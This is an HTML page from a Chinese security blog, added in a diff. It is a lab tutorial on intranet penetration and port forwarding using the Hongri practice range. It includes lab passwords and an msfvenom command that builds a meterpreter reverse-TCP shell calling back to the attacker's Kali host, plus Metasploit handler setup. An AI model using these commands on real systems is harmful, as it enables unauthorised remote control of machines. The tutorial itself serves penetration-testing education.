@@ -1,0 +1,529 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.26.8" theme-name="Stellar" theme-version="1.26.8">
+  
+  <meta name="generator" content="Hexo 7.1.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel="preconnect" href="https://gcore.jsdelivr.net" crossorigin><link rel="preconnect" href="https://unpkg.com" crossorigin><link rel="preconnect" href="https://cdn.bootcdn.net" crossorigin>
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>内网渗透 01 - 端口转发 - 妙尽璇机</title>
+
+  
+    <meta name="description" content="在进行渗透测试过程中会遇到内网中的其他机器是不允许外网机器访问的，因此需要通过端口转发(即隧道)或将得到的外网服务器设置为代理，使得攻击机可以直接访问并操作内网中的其他机器，这一过程就叫做内网转发。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透 01 - 端口转发">
+<meta property="og:url" content="https://changeyourway.github.io/2024/05/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F01-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/index.html">
+<meta property="og:site_name" content="妙尽璇机">
+<meta property="og:description" content="在进行渗透测试过程中会遇到内网中的其他机器是不允许外网机器访问的，因此需要通过端口转发(即隧道)或将得到的外网服务器设置为代理，使得攻击机可以直接访问并操作内网中的其他机器，这一过程就叫做内网转发。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240406132032083.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240406132728218.png">
+<meta property="og:image" content="https://changeyourway.github.io/images/image-20240407090636373.png">
+<meta property="article:published_time" content="2024-05-16T02:55:28.868Z">
+<meta property="article:modified_time" content="2024-10-06T07:54:27.066Z">
+<meta property="article:author" content="妙尽璇机">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://changeyourway.github.io/images/image-20240406132032083.png">
+  
+  
+  
+  
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="妙尽璇机" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.26.8">
+
+  
+    <link rel="shortcut icon" href="/assets/favicon/favicon.ico">
+  
+
+  
+
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/xaoxuu/favicon/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/xaoxuu/favicon/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/xaoxuu/favicon/favicon-16x16.png"><link rel="manifest" href="/assets/xaoxuu/favicon/site.webmanifest"><link rel="shortcut icon" href="/assets/xaoxuu/favicon/favicon.ico"><meta name="theme-color" content="#f8f8f8"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/style.min.css" media="all" />
+</head>
+<body>
+
+<div class="l_body content tech" id="start" layout="post" ><aside class="l_left"><div class="sidebar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://avatars.githubusercontent.com/u/167730365?v=4" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">妙尽璇机</div><div class="sub cap">以真理之名，超越往昔</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="专栏" href="/topic/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="探索" href="/explore/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
+</div>
+<div class="widgets">
+
+<widget class="widget-wrapper toc single" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89%E6%90%AD%E5%BB%BA"><span class="toc-text">红日靶场（一）搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E4%B8%8A%E4%BC%A0-shell-%E4%BD%BF-kali-%E6%8E%A7%E5%88%B6-win2019"><span class="toc-text">通过上传 shell 使 kali 控制 win2019</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mount-%E6%8C%82%E8%BD%BD%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="toc-text">mount 挂载共享文件夹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf-%E7%94%9F%E6%88%90-payload%EF%BC%9A"><span class="toc-text">msf 生成 payload：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-text">内网渗透-端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%EF%BC%88Port-Mapping%EF%BC%89"><span class="toc-text">端口映射（Port Mapping）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%EF%BC%88Port-Forwarding%EF%BC%89"><span class="toc-text">端口转发（Port Forwarding）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%BA%E5%88%AB%E6%80%BB%E7%BB%93"><span class="toc-text">区别总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows-%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E7%94%A8-netsh-%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-text">windows 命令行下用 netsh 实现端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF-portfwd-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84"><span class="toc-text">MSF portfwd 端口转发与端口映射</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lcx-exe-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%B7%A5%E5%85%B7"><span class="toc-text">lcx.exe 端口转发工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%90%8E%E5%A6%82%E4%BD%95%E8%BF%9E%E6%8E%A5"><span class="toc-text">各种端口转发后如何连接</span></a></li></ol></li></ol></div></div></widget>
+
+
+
+
+
+
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title" href="/2024/11/13/Java%20%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%AF%87-Hessian%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/"><span class="title">基础篇 - Hessian 协议详解</span></a><a class="item title" href="/2024/10/31/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-JavaAgent%E5%86%85%E5%AD%98%E9%A9%AC/"><span class="title">漏洞篇 - JavaAgent 内存马</span></a><a class="item title" href="/2024/10/23/Java%20%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%AF%87-JavaAgent%E8%AF%A6%E8%A7%A3/"><span class="title">基础篇 - Java Agent 详解</span></a><a class="item title" href="/2024/10/21/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Spring%E5%86%85%E5%AD%98%E9%A9%AC/"><span class="title">漏洞篇 - Spring 内存马</span></a><a class="item title" href="/2024/06/07/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Rome%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"><span class="title">漏洞篇 - Java 反序列化之 Rome 链</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    
+<div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-05-16T02:55:28.868Z">2024-05-16</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-10-06T07:54:27.066Z">2024-10-06</time></span></div></div>
+</div>
+
+    
+    <div class="bottom">
+      <div class="text-area">
+        <h1 class="text title"><span>内网渗透 01 - 端口转发</span></h1>
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><p>在进行渗透测试过程中会遇到内网中的其他机器是不允许外网机器访问的，因此需要通过端口转发(即隧道)或将得到的外网服务器设置为代理，使得攻击机可以直接访问并操作内网中的其他机器，这一过程就叫做内网转发。</p>
+<span id="more"></span>
+
+<h2 id="红日靶场（一）搭建"><a href="#红日靶场（一）搭建" class="headerlink" title="红日靶场（一）搭建"></a>红日靶场（一）搭建</h2><p>推荐博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46363249/article/details/121441832">[WEB安全]红日靶场（一）环境搭建</a></p>
+<p>初始密码：hongrisec@2019</p>
+<p>设置好网段如下：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240406132032083.png">
+
+<p>在此划分出 VMnet1 和 VMnet8 两个网段，VMnet1 为 Windows 虚拟机的内网网段，VMnet8 为模拟的外网网段。</p>
+<p>可以在物理机 win11 上查看：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240406132728218.png">
+
+<p>win2003 太抽象了，所以换成 win2019 。</p>
+<p>最终形成的 IP 划分情况如下：</p>
+<table>
+<thead>
+<tr>
+<th>主机</th>
+<th>IP地址</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>物理机 win11</td>
+<td>192.168.217.1（ VMnet8 的 IP ）</td>
+</tr>
+<tr>
+<td>win7 边界服务器</td>
+<td>外网IP：192.168.217.137；内网IP：192.168.52.143</td>
+</tr>
+<tr>
+<td>win2008</td>
+<td>内网IP：192.168.52.138</td>
+</tr>
+<tr>
+<td>win2019</td>
+<td>内网IP：192.168.52.128</td>
+</tr>
+<tr>
+<td>win2003（弃用）</td>
+<td>内网IP：192.168.52.141</td>
+</tr>
+</tbody></table>
+<p>提示密码过期，那么我们重新设置一下密码：</p>
+<p>win7：win7@test</p>
+<p>win server 2003（弃用）：win2003@test</p>
+<p>win server 2008：win2008@test</p>
+<p>win server 2019：Administrator - ChinaSkills22</p>
+<p>内网环境至此就搭好了，其中 win7 为边界服务器，在外网中开放，而 win2008 和 win2019 不对公网开放。</p>
+<p>在测试时，一定要将 Windows 的防火墙全部关闭哦~</p>
+<p><strong>但是，按照上面的搭建方法，即使 kali 在 VMnet8 网段中，也能访问到 VMnet1 网段（即内网）的机器，这明显不符合要求。因此，我将 kali 与 win7 的其中一个网卡设置为桥接网卡，抛弃了 VMnet8 网段，但也因此无法使用校园网。在这种情况下，kali 就只能访问 win7 的外网 IP ，而无法访问内网网段了。</strong> </p>
+<p>此时我的 kali IP：192.168.43.173，win 7 外网 IP：192.168.43.136 。</p>
+<p><strong>之后遇到的问题就是 shell 没有办法上传到 win7 虚拟机上，无论是复制粘贴还是 mount 挂载，于是我又做了一些调整，将 win2019 作为边界服务器，在外网开放，而 win7 则作为内网机器。</strong> </p>
+<p>此时我的 win2019 的外网 IP 为：192.168.43.13 。</p>
+<p><strong>xampp</strong> </p>
+<p>XAMPP（Apache+MySQL+PHP+PERL）是一个功能强大的建站集成软件包。</p>
+<p><strong>perl</strong> </p>
+<p>Perl 是由 Larry Wall 设计的，并由他不断更新和维护的编程语言。</p>
+<p>Perl 具有高级语言（如 C ）的强大能力和灵活性。事实上，你将看到，它的许多特性是从 C 语言中借用来的。</p>
+<p>Perl 与脚本语言一样，Perl 不需要编译器和链接器来运行代码，你要做的只是写出程序并告诉 Perl 来运行而已。这意味着 Perl 对于小的编程问题的快速解决方案和为大型事件创建原型来测试潜在的解决方案是十分理想的。</p>
+<p>Perl 提供脚本语言（如 sed 和 awk ）的所有功能，还具有它们所不具备的很多功能。Perl 还支持 sed 到 Perl 及 awk 到 Perl 的翻译器。</p>
+<p>简而言之，Perl 像 C 一样强大，像 awk 、sed 等脚本描述语言一样方便。</p>
+<h2 id="通过上传-shell-使-kali-控制-win2019"><a href="#通过上传-shell-使-kali-控制-win2019" class="headerlink" title="通过上传 shell 使 kali 控制 win2019"></a>通过上传 shell 使 kali 控制 win2019</h2><h3 id="mount-挂载共享文件夹"><a href="#mount-挂载共享文件夹" class="headerlink" title="mount 挂载共享文件夹"></a>mount 挂载共享文件夹</h3><p>推荐博客：<a target="_blank" rel="noopener" href="https://juejin.cn/post/7025786131392233485">Linux 挂载 Windows 共享目录</a> </p>
+<p>创建要共享的文件夹：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /mnt/myshare</span><br></pre></td></tr></table></figure>
+
+<p>挂载共享文件夹：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t cifs -o username=miao,password=Ab123456 //192.168.43.13/tiquan /mnt/myshare</span><br></pre></td></tr></table></figure>
+
+<p>查询挂载状态：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount</span><br></pre></td></tr></table></figure>
+
+<p>解除挂载：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">umount /mnt/myshare</span><br></pre></td></tr></table></figure>
+
+<h3 id="msf-生成-payload："><a href="#msf-生成-payload：" class="headerlink" title="msf 生成 payload："></a>msf 生成 payload：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.43.173 lport=4444 -a x64 -f exe -o shell.exe</span><br></pre></td></tr></table></figure>
+
+<p>通过 mount 挂载的共享文件夹将 shell 传到 win2019 上：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp shell.exe /mnt/myshare/shell.exe</span><br></pre></td></tr></table></figure>
+
+<p>进入 msf 控制台：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole </span><br></pre></td></tr></table></figure>
+
+<p>使用 use 进入模块，exploit&#x2F;multi&#x2F;handler 是 msf 的侦听模块：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure>
+
+<p>设置 kali 的 IP 和端口号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.43.173</span><br><span class="line">set lport 4444</span><br></pre></td></tr></table></figure>
+
+<p>开启监听：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run/exploit</span><br></pre></td></tr></table></figure>
+
+<p>此时在 win2019 上执行 shell.exe 即可。</p>
+<p>从 meterpreter 进入 Windows 命令行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
+
+<p>解决编码问题：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chcp 65001</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="内网渗透-端口转发"><a href="#内网渗透-端口转发" class="headerlink" title="内网渗透-端口转发"></a>内网渗透-端口转发</h2><p>在进行渗透测试过程中会遇到内网中的其他机器是不允许外网机器访问的，因此需要通过端口转发(即隧道)或将得到的外网服务器设置为代理，使得攻击机可以直接访问并操作内网中的其他机器，这一过程就叫做内网转发。</p>
+<p>端口映射（Port Mapping）和端口转发（Port Forwarding）是网络配置中的两个概念，虽然有相似之处，但它们在用途和实现上有一些不同之处。</p>
+<h3 id="端口映射（Port-Mapping）"><a href="#端口映射（Port-Mapping）" class="headerlink" title="端口映射（Port Mapping）"></a>端口映射（Port Mapping）</h3><p><strong>定义</strong>： 端口映射是一种将一个特定的端口号映射到另一个端口号的技术，通常用于路由器或防火墙来允许外部设备通过特定端口访问内部网络中的设备。</p>
+<p><strong>用法</strong>：</p>
+<ul>
+<li>通常用于在内网（如局域网）中的某个设备（如服务器）需要被外部网络访问时，路由器或防火墙通过将外部请求的端口映射到内部设备的相应端口来实现。</li>
+<li>例如，外部设备通过访问路由器的端口 80 来访问内网服务器的端口 8080 。</li>
+</ul>
+<p><strong>示例</strong>： 假设你有一个家庭网络，其中一台计算机运行一个 Web 服务器，监听端口 8080 。你希望外部用户能够通过访问你家庭网络的公共 IP 地址上的端口 80 来访问这个 Web 服务器。</p>
+<ul>
+<li>公共 IP 地址：203.0.113.1</li>
+<li>内部 IP 地址：192.168.1.100</li>
+<li>内部 Web 服务器端口：8080</li>
+</ul>
+<p>在路由器上设置端口映射，将公共 IP 的端口 80 映射到内部 IP 地址的端口 8080 ：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">203.0.113.1:80 -&gt; 192.168.1.100:8080</span><br></pre></td></tr></table></figure>
+
+<h3 id="端口转发（Port-Forwarding）"><a href="#端口转发（Port-Forwarding）" class="headerlink" title="端口转发（Port Forwarding）"></a>端口转发（Port Forwarding）</h3><p><strong>定义</strong>： 端口转发是一种将网络流量从一个 IP 地址的特定端口重定向到另一个 IP 地址的特定端口的技术。这通常用于将外部网络的流量重定向到内部网络中的特定设备。</p>
+<p><strong>用法</strong>：</p>
+<ul>
+<li>主要用于将外部网络的请求转发到内网中的设备，以实现对内网资源的访问。</li>
+<li>比端口映射更广泛，通常不仅仅是端口号的映射，还包括 IP 地址的重定向。</li>
+<li>通常用于允许外部设备通过路由器或防火墙访问内网设备上的服务。</li>
+</ul>
+<p><strong>示例</strong>： 与上例类似，但这次我们不仅重定向端口，还重定向流量到另一个内部设备：</p>
+<ul>
+<li>公共 IP 地址：203.0.113.1</li>
+<li>内部 Web 服务器 IP 地址：192.168.1.100</li>
+<li>内部 Web 服务器端口：80</li>
+</ul>
+<p>设置端口转发，将公共 IP 的端口 80 上的流量重定向到内部 Web 服务器的 IP 地址和端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">203.0.113.1:80 -&gt; 192.168.1.100:80</span><br></pre></td></tr></table></figure>
+
+<h3 id="区别总结"><a href="#区别总结" class="headerlink" title="区别总结"></a>区别总结</h3><ul>
+<li><strong>端口映射（Port Mapping）</strong>：主要涉及端口号的映射，可以将外部端口映射到内部不同的端口。常用于在路由器或防火墙上设置特定的端口映射规则。</li>
+<li><strong>端口转发（Port Forwarding）</strong>：不仅可以涉及端口号的重定向，还可以涉及 IP 地址的重定向。常用于将外部网络的请求转发到内网中的设备，以实现对内网资源的访问。</li>
+</ul>
+<p>尽管术语有时可以互换使用，但严格来说，端口转发更广泛，包含了端口映射的功能，但也涉及更复杂的流量重定向规则。</p>
+<h3 id="windows-命令行下用-netsh-实现端口转发"><a href="#windows-命令行下用-netsh-实现端口转发" class="headerlink" title="windows 命令行下用 netsh 实现端口转发"></a>windows 命令行下用 netsh 实现端口转发</h3><p>自 Windows XP 开始，Windows 中就内置网络端口转发的功能。任何传入到本地端口的 TCP 连接（ IPv4 或 IPv6 ）都可以被重定向到另一个本地端口，或远程计算机上的端口，并且系统不需要有一个专门用于侦听该端口的服务。</p>
